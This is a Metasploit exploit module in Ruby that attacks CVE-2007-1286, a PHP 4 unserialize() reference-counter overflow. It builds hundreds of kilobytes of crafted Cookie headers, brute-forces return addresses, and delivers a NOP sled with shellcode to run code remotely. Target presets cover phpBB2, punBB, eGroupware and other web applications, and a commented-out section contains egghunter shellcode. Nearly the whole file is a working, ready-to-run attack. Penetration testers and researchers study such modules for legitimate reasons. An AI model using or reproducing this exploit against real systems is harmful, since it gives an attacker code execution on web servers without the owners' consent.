##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Brute
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'PHP 4 unserialize() ZVAL Reference Counter Overflow (Cookie)',
			'Description'    => %q{
				This module exploits an integer overflow vulnerability in the unserialize()
			function of the PHP web server extension. This vulnerability was patched by
			Stefan in version 4.5.0 and applies all previous versions supporting this function.
			This particular module targets numerous web applications and is based on the proof
			of concept provided by Stefan Esser. This vulnerability requires approximately 900k
			of data to trigger due the multiple Cookie headers requirement. Since we
			are already assuming a fast network connection, we use a 2Mb block of shellcode for
			the brute force, allowing quick exploitation for those with fast networks. 
			
			One of the neat things about this vulnerability is that on x86 systems, the EDI register points
			into the beginning of the hashtable string. This can be used with an egghunter to
			quickly exploit systems where the location of a valid "jmp EDI" or "call EDI" instruction
			is known. The EDI method is faster, but the bandwidth-intensive brute force used by this
			module is more reliable across a wider range of systems.
			
			
			},
			'Author'         => 
				[ 
					'hdm',                                        # module development
					'GML <grandmasterlogic [at] gmail.com>',      # module development and debugging
					'Stefan Esser <sesser [at] hardened-php.net>' # discovered, patched, exploited
				], 
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['CVE', '2007-1286'],
					['OSVDB', '32771'],
					['URL', 'http://www.php-security.org/MOPB/MOPB-04-2007.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
				},
			'Targets'        => 
				[
				
					#
					# 64-bit SuSE:    0x005c0000
					# Backtrack 2.0:  0xb797a000
					# Gentoo:         0xb6900000
					#
					[ 'Linux x86 Generic', 
						{						
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],					
					[ 'Linux x86 phpBB2', 
						{
							'DefaultCookie' => 'phpbb2mysql_data',
							'DefaultURI'    => '/phpBB2/faq.php',
							'Signature'     => /Powered\s+by.*phpBB/,							
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 punBB', 
						{
							'DefaultCookie' => 'punbb_cookie',
							'DefaultURI'    => '/index.php',
							'Signature'     => /Powered\s+by.*PunBB/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 WWWThreads', 
						{
							'DefaultCookie' => 'forum_cookie',
							'DefaultURI'    => '/index.php',
							'Signature'     => /Powered\s+by.*WWWThreads/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 Deadman Redirect', 
						{
							'DefaultCookie' => 'authcookie',
							'DefaultURI'    => '/dmr/dmr.php',
							'Signature'     => /document\.f\.userdata\.focus/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 PhpWebGallery', 
						{
							'DefaultCookie' => 'pwg_remember',
							'DefaultURI'    => '/phpwebgallery/index.php',
							'Signature'     => /Powered\s+by.*phpwebgallery/msi,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 Ariadne-CMS', 
						{
							'DefaultCookie' => 'ARCookie',
							'DefaultURI'    => '/ariadne/loader.php/',
							'Signature'     => /Ariadne is free software/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],
					[ 'Linux x86 ProMA', 
						{
							'DefaultCookie' => 'proma',
							'DefaultURI'    => '/proma/index.php',
							'Signature'     => /Change Account Information/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					],													
					[ 'Linux x86 eGroupware', 
						{
							'DefaultCookie' => 'eGW_remember',
							'DefaultURI'    => '/egroupware/login.php',
							'Signature'     => /www.egroupware.org/,
							'Platform'      => 'linux', 
							'Arch'          => [ ARCH_X86 ],
							'Bruteforce' => 
								{
									'Start' => { 'Ret' => 0xb6000400 },
									'Stop'  => { 'Ret' => 0xbfff0000 },
									'Step'  => 1024*1024
								}							
						}
					]						
				],
			'DisclosureDate' => 'Mar 04 2007'))
			
			register_options(
				[
					OptString.new('URI', [false, "The path to vulnerable PHP script"]),
					OptString.new('COOKIENAME', [false, "The name of the cookie passed to unserialize()"])
				], self.class)
	end


	def check
		print_status("Checking for a vulnerable PHP version...")

		#
		# Pick the URI and Cookie name
		#
		cookie_name = datastore['COOKIENAME'] || target['DefaultCookie']
		uri_path    = datastore['URI']        || target['DefaultURI']

		if(not cookie_name)
			raise RuntimeError, "The COOKIENAME option must be set"
		end
		
		if(not uri_path)
			raise RuntimeError, "The URI option must be set"
		end
				
		res = send_request_cgi({
			'uri'		  => uri_path,
			'method'	  => 'GET'
		}, 5)
		
		php_bug = false
		
		if (not res)
			print_status("No response from the server")
			return Exploit::CheckCode::Safe
		end
		
		if (res.code != 200)
			print_status("The server returned #{res.code} #{res.message}")
			return Exploit::CheckCode::Safe	
		end
		
		if (
			(res.headers['X-Powered-By'] and res.headers['X-Powered-By'] =~ /PHP\/(.*)/) or
			(res.headers['Server'] and res.headers['Server'] =~ /PHP\/(.*)/)
		   )
		   
			php_raw = $1
			php_ver = php_raw.split('.')

			if (php_ver[0].to_i == 4 and php_ver[1] and php_ver[2] and php_ver[1].to_i < 5)
				print_status("The server runs a vulnerable version of PHP (#{php_raw})")
				php_bug = true
			else
				print_status("The server runs a non-vulnerable version of PHP (#{php_raw})")
				return Exploit::CheckCode::Safe	
			end
		end
		
		# Detect the phpBB cookie name
		if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'] =~ /(.*)_(sid|data)=/)
			print_status("The server may require a cookie name of '#{$1}_data'")
		end

		if(target and target['Signature'])
			if (res.body and res.body.match(target['Signature'])) 
				print_status("Detected target #{target.name}")
			else
				print_status("Did not detect target #{target.name}")
			end

		end

		return php_bug ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Appears
	end


	def brute_exploit(target_addrs)
	
		zvalref   = encode_semis('i:0;R:2;')

#
# Use this if we decide to do 'jmp edi' returns vs brute force
#
=begin
		# Linux specific egg-hunter
		tagger = "\x90\x50\x90\x50"
		hunter = 
			"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80" +
			"\x3c\xf2\x74\xf1\xb8" +
			tagger +
			"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"

		egghunter = "\xcc" * 39
		egghunter[0, hunter.length] = hunter
		
		hashtable = "\xcc" * 39
		hashtable[0, 2] = "\xeb\xc6" # jmp back 32 bytes
		
		hashtable[20, 4] = [target_addrs['Ret']].pack('V')
		hashtable[32, 4] = [target_addrs['Ret']].pack('V')
=end

		#
		# Just brute-force addresses for now
		# 
		tagger    = ''
		egghunter = rand_text_alphanumeric(39)
		hashtable = rand_text_alphanumeric(39)
		hashtable[20, 4] = [target_addrs['Ret']].pack('V')
		hashtable[32, 4] = [target_addrs['Ret']].pack('V')


		#
		# Pick the URI and Cookie name
		#
		cookie_name = datastore['COOKIENAME'] || target['DefaultCookie']
		uri_path    = datastore['URI']        || target['DefaultURI']

		if(not cookie_name)
			raise RuntimeError, "The COOKIENAME option must be set"
		end
		
		if(not uri_path)
			raise RuntimeError, "The URI option must be set"
		end
		
		# Generate and reuse the original buffer to save CPU
		if (not @saved_cookies)
		
			# Building the malicious request
			print_status("Creating the request...")
				
			# Create the first cookie header to get this started
			cookie_fun = "Cookie: #{cookie_name}="
			cookie_fun << Rex::Text.uri_encode(
				'a:100000:{s:8:"' + 
				rand_text_alphanumeric(8) +
				'";a:3:{s:12:"' + 
				rand_text_alphanumeric(12) + 
				'";a:1:{s:12:"' +
				rand_text_alphanumeric(12) +
				'";i:0;}s:12:"' +
				rand_text_alphanumeric(12) +
				'";'+
				'i:0;s:12:"' +
				rand_text_alphanumeric(12) +
				'";i:0;}'
			)
			cookie_fun << zvalref * 500
			cookie_fun << Rex::Text.uri_encode('s:2:"')
			cookie_fun << "\r\n"

			refcnt = 1000
			refmax = 65535

			# Keep adding cookie headers...
			while(refcnt < refmax) 

				chead   = 'Cookie: ';
				chead  << encode_semis('";N;')

				# Stay within the 8192 byte limit
				0.upto(679) do |i|
					break if refcnt >= refmax
					refcnt += 1

					chead << zvalref
				end
				chead << encode_semis('s:2:"')
				cookie_fun << chead + "\r\n"
			end

			# The final header, including the hashtable with return address
			cookie_fun << "Cookie: "
			cookie_fun << Rex::Text.uri_encode('";N;')
			cookie_fun << zvalref * 500	
			
			@saved_cookies = cookie_fun
		end

		# Generate and reuse the payload to save CPU time
		if (not @saved_payload)
			@saved_payload = ((tagger + tagger + make_nops(8192) + payload.encoded) * 256)
		end
		
		cookie_addrs = Rex::Text.uri_encode(
			's:39:"' + egghunter + '";s:39:"'+ hashtable +'";i:0;R:3;'
		) + "\r\n"

		print_status("Trying address 0x%.8x..." % target_addrs['Ret'])
		res = send_request_cgi({
			'uri'		  => uri_path,
			'method'	  => 'POST',
			'raw_headers' => @saved_cookies + cookie_addrs,
			'data'        => @saved_payload
		}, 1)

		
		if res
			failed = false
			
			print_status("Received a response: #{res.code} #{res.message}")

			if (res.code != 200)
				print_status("The server returned a non-200 response, indicating that the exploit failed.")
				failed = true			
			end
						
			if (not failed and (res.body and res.body.length > 0))
				print_status("The server returned a real response, indicating that the exploit failed.")
				failed = true
			end
			
			if (failed)
				print_status("Please verify the URI and COOKIENAME parameters.")
				print_line('')
				print_line("*" * 40)
				print_line(res.body)
				print_line("*" * 40)
				print_line('')
								
				raise RuntimeError, "Exploit settings are probably wrong"				
			end
		else
			print_status("No response from the server")
		end

	end

	def encode_semis(str)
		str.gsub(';') { |s| sprintf("%%%.2x", s[0]) }
	end

end
